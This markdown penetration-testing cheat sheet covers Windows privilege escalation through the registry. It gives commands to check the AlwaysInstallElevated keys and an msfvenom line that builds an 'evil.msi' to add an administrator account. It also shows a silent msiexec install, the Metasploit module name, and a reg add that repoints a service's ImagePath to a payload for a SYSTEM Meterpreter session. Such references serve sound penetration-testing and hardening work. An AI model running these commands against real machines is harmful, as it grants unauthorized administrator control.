## Registry

### AlwaysInstallElevated
* AlwaysInstallElevated is a setting that allows non-privileged users the ability to run Microsoft Windows Installer Package Files (MSI) with elevated (SYSTEM) permissions.

  ```
  [HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer]
“AlwaysInstallElevated”=dword:00000001

  [HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer]
  “AlwaysInstallElevated”=dword:00000001
  ```

* Check for these registry entries
  ```
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  ```
  This will only work if both registry keys contain "AlwaysInstallElevated" with DWORD values of 1.

  *Note:*  If you happen to get an error message similar to: The system was unable to find the specified registry key or value, it may be that a Group Policy setting for AlwaysInstallElevated was never defined, and therefore an associated registry entry doesn’t exist.

* If AlwaysInstallElevated is enabled for both the local machine and the current user, we can proceed to utilize MSFVenom to generate an MSI file that, when executed on the victim machine, will add a user to the Local Administrators group:
  ```
  msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o evil.msi
  ```

* Now run the installation via the commandline:
  ```
  msiexec /quiet /qn /i C:\evil.msi
  ```
  - `/quiet` = Suppress any messages to the user during installation
  - `/qn` = No GUI
  - `/i` = Regular (vs. administrative) installation

* Metasploit Module
  ```
  exploit/windows/local/always_install_elevated
  ```

### Insecure Registry Permissions

Not very common due to the fact that write access to the services registry key is granted only to Administrators by default.

* Registry keys for the services that are running on the system can be found in the following registry path:
  ```
  HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services
  ```

* If a standard user has permissions to modify the registry key “ImagePath” which contains the path to the application binary then he could escalate privileges to system as the Apache service is running under these privileges.

* The only thing that is required is to add a registry key that will change the ImagePath to the location of where the malicious payload is stored.
  ```
  > reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Apache" /t REG_EXPAND_SZ /v ImagePath /d "C:\xampp\pentestlab2.exe" /f
  ```

* The next time that the service will restart, the custom payload will be executed instead of the service binary and it will return back a Meterpreter session as SYSTEM.
